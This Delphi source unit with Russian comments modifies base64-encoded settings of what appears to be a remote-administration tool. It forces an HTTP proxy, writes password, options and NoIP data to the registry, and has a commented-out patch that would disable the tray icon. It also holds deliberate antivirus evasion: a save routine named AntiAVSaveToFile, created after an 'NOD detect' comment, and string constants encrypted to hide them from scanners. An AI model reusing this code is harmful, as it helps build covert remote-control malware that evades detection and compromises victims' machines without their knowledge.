unit XmlWrk;

interface

uses
  Windows, Classes;

  function SetSubXMLParameters(const FileName, ASubXmlName: string;
                               AParamsList: TStringList;
                               RegRootKey: DWORD = 0;
                               RegKey: string = ''): Boolean;
  function SetSubXMLParameters2(const FileName, ASubXmlName, AProxyHostPort: string): Boolean;

  function XML2Registry(const FileName: string; RegRootKey: DWORD; RegKey: string): Boolean;


implementation

uses
   SysUtils, NativeXml, RegWrk, Crypto, RxStrUtils;


{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function StringToStream(const AString: string): TStream;
begin
  Result := TStringStream.Create(AString);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function SetXMLValues(AXmlDoc: TNativeXml; const AParamsList: TStringList): Boolean;
var
  i: Integer;
  XmlNode: TXmlNode;
begin
  Result := False;
  if not Assigned(AParamsList) then
     Exit;
     
  for i := 0 to AParamsList.Count - 1 do
  begin
    XmlNode := AXmlDoc.Root.NodeByName(AParamsList.Names[i]);
    if not Assigned(XmlNode) then
       Continue;
    XmlNode.Value := AParamsList.ValueFromIndex[i];
  end;
end;


{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
procedure AntiAVSaveToFile(AXML: TNativeXml; const AFileName: string);
var
  S: TStream;
begin
  S := TFileStream.Create(AFileName, fmCreate);
  try
    AXML.SaveToStream(S);
  finally
    S.Free;
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
// FileName - имя xml-файла
// ASubXmlName - имя узла, который содержит base64 дочерний XML
// AParamsList - список вида: параметр=значение
function SetSubXMLParameters(const FileName, ASubXmlName: string;
                             AParamsList: TStringList;
                             RegRootKey: DWORD = 0;
                             RegKey: string = ''): Boolean;

var
  ParentXmlDoc, SubXmlDoc: TNativeXml;
  XmlNode: TXmlNode;
//  UStr: Utf8String;
  S: string;
  XmlStream: TStream;
begin
  Result := False;

  if not FileExists(FileName) or not Assigned(AParamsList) then
     Exit;

  ParentXmlDoc := TNativeXml.Create(nil);
  SubXmlDoc    := TNativeXml.Create(nil);
  try
    ParentXmlDoc.LoadFromFile(FileName);

    // Читаем узел с base64 xml
    XmlNode := ParentXmlDoc.Root.NodeByName(ASubXmlName);
    if not Assigned(XmlNode) then
       Exit;
    S := DecodeBase64(XmlNode.Value);

    // Создаем новый XML с ним
    XmlStream := StringToStream(S);
    try
      // Заполняем параметры
      SubXmlDoc.LoadFromStream(XmlStream);
      SubXmlDoc.XmlFormat := xfPreserve;
      SetXMLValues(SubXmlDoc, AParamsList);

      // Пишем в реестр, если надо
//      if (RegRootKey <> 0) and (RegKey <> '') then
//        WriteXmlNodeToReg(RegRootKey, RegKey, ASubXmlName, SubXmlDoc.WriteToString);

      // И записываем обратно, необходимо использовать обычный string, а не UTF8
      S := EncodeBase64(SubXmlDoc.WriteToString);
      XmlNode.Value := S;

      //ParentXmlDoc.SaveToFile(FileName); // NOD detect 11.06.2015
      AntiAVSaveToFile(ParentXmlDoc, FileName);

      Result := True;
    finally
      XmlStream.Free;
    end;
  finally
    ParentXmlDoc.Free;
    SubXmlDoc.Free;
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
// FileName - имя xml-файла
// ASubXmlName - имя узла, который содержит base64 дочерний XML
// AProxyHostPort - параметры прокси в виде host:port
// В свойствах объекта в Delphi $09 = Enabled, $08 = Disabled
function SetSubXMLParameters2(const FileName, ASubXmlName, AProxyHostPort: string): Boolean;
const
  _DISABLED = Char($08);
  _ENABLED  = Char($09);
  SHOW_TRAY_ICON = {#CRYPT 'ShowTrayIcon'}#46#247#152#45#55#202#244#242#23#231#54#214#13#235{ENDC};
  USE_HTTP_PROXY = {#CRYPT 'UseHTTPProxyServer'}#46#241#199#96#117#166#77#180#250#113#90#201#43#195#1#102#95#168#51#32{ENDC};
  PROXY_TYPE     = {#CRYPT 'ProxyType'}#46#244#32#26#124#228#166#171#133#44#0{ENDC};
  PROXY_HOST     = {#CRYPT 'ProxyHost'}#46#244#32#26#124#228#186#42#252#38#246{ENDC};
  PROXY_PORT     = {#CRYPT 'ProxyPort'}#46#244#32#26#124#228#162#58#252#183#177{ENDC};
  PROXY_AUTH     = {#CRYPT 'ProxyAuthentication'}#46#244#32#26#124#228#179#92#78#239#160#34#22#172#102#239#66#124#154#121#4{ENDC};
  ID_CONNECTION  = {#CRYPT 'IDConnection'}#46#237#115#169#122#129#214#23#215#246#20#248#51#238{ENDC};
var
  ParentXmlDoc, SubXmlDoc: TNativeXml;
  XmlNode: TXmlNode;
  binStr: string;
//  XmlStream: TStream;
  Idx: Integer;
  S: string;
  sProxyHost, sProxyPort: string;
begin
  Result := False;

  if not FileExists(FileName) or (AProxyHostPort = '') then
     Exit;

  sProxyHost := Copy(AProxyHostPort, 1,
                                     Pos(':', AProxyHostPort) - 1);
  sProxyPort := Copy(AProxyHostPort, Pos(':', AProxyHostPort) + 1,
                                     Length(AProxyHostPort) - Pos(':', AProxyHostPort));

  ParentXmlDoc := TNativeXml.Create(nil);
  SubXmlDoc    := TNativeXml.Create(nil);
  try
    ParentXmlDoc.LoadFromFile(FileName);

    // Читаем узел с base64 xml
    XmlNode := ParentXmlDoc.Root.NodeByName(ASubXmlName);
    if not Assigned(XmlNode) then
       Exit;
    binStr := DecodeBase64(XmlNode.Value);

    {* ShowTrayIcon *}
//     Idx := Pos(DecStr(SHOW_TRAY_ICON), binStr);
//     if Idx > 0 then
//        binStr[Idx + Length(DecStr(SHOW_TRAY_ICON))] := _DISABLED;

    {* UseHTTPProxyServer *}
     Idx := Pos(DecStr(USE_HTTP_PROXY), binStr);
     if Idx > 0 then
        binStr[Idx + Length(DecStr(USE_HTTP_PROXY))] := _ENABLED;

    {* Ищем место для записи хвоста с параметрами прокси *}
     Idx := Pos(DecStr(PROXY_TYPE), binStr);
     if Idx > 0 then
       begin
         // Обрезаем хвост
         binStr := Copy(binStr, 1, Idx + Length(DecStr(PROXY_TYPE)) + 2);

         // ProxyHost
         binStr := binStr + DecStr(PROXY_HOST) + #06;
         binStr := binStr + Char(Length(sProxyHost));
         binStr := binStr + sProxyHost + #09;

         // ProxyPort
         binStr := binStr + DecStr(PROXY_PORT) + #03;
         binStr := binStr + Char(Lo(StrToInt(sProxyPort)));
         binStr := binStr + Char(Hi(StrToInt(sProxyPort))) + #13;

         // ProxyAuth
         binStr := binStr + DecStr(PROXY_AUTH) + #08 + Char($0C);

         // IDConnection
         binStr := binStr + DecStr(ID_CONNECTION) + #06 + Char($10);
         binStr := binStr + MakeStr('A', $10) + #0 + #0;

         S := EncodeBase64(binStr);
         XmlNode.Value := S;

         ParentXmlDoc.SaveToFile(FileName);
         Result := True;
       end;
  finally
    ParentXmlDoc.Free;
    SubXmlDoc.Free;
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
{* Переводит параметры из XML в реестр                                                            *}
function XML2Registry(const FileName: string; RegRootKey: DWORD; RegKey: string): Boolean;
const
  PWD_NODE = {#CRYPT 'Pwd'}#46#244#37#181#228{ENDC};
  OPTIONS_NODE = {#CRYPT 'Options'}#46#235#8#93#135#58#149#15#93{ENDC};
  NOIP_SETTINGS = {#CRYPT 'NoIPSettings'}#46#234#246#90#178#241#19#234#213#100#170#82#44#212{ENDC};
var
  ParentXmlDoc: TNativeXml;
  XmlNode: TXmlNode;
  binStr: string;
begin
  Result := False;

  if not FileExists(FileName) then
     Exit;

  ParentXmlDoc := TNativeXml.Create(nil);
  try
    ParentXmlDoc.LoadFromFile(FileName);

   (* Pwd *)
    XmlNode := ParentXmlDoc.Root.NodeByName(DecStr(PWD_NODE));
    if Assigned(XmlNode) then
      begin
        binStr := DecodeBase64(XmlNode.Value);
        if binStr <> '' then
           WriteXmlNodeToReg(RegRootKey, RegKey, DecStr(PWD_NODE), binStr);
      end;
   (* Options *)
    XmlNode := ParentXmlDoc.Root.NodeByName(DecStr(OPTIONS_NODE));
    if Assigned(XmlNode) then
      begin
        binStr := DecodeBase64(XmlNode.Value);
        if binStr <> '' then
           WriteXmlNodeToReg(RegRootKey, RegKey, DecStr(OPTIONS_NODE), binStr);
      end;
   (* NoIpSettings *)
    XmlNode := ParentXmlDoc.Root.NodeByName(DecStr(NOIP_SETTINGS));
    if Assigned(XmlNode) then
      begin
        binStr := DecodeBase64(XmlNode.Value);
        if binStr <> '' then
           WriteXmlNodeToReg(RegRootKey, RegKey, DecStr(NOIP_SETTINGS), binStr);
      end;
    Result := True;
  finally
    ParentXmlDoc.Free;
  end;
end;


end.
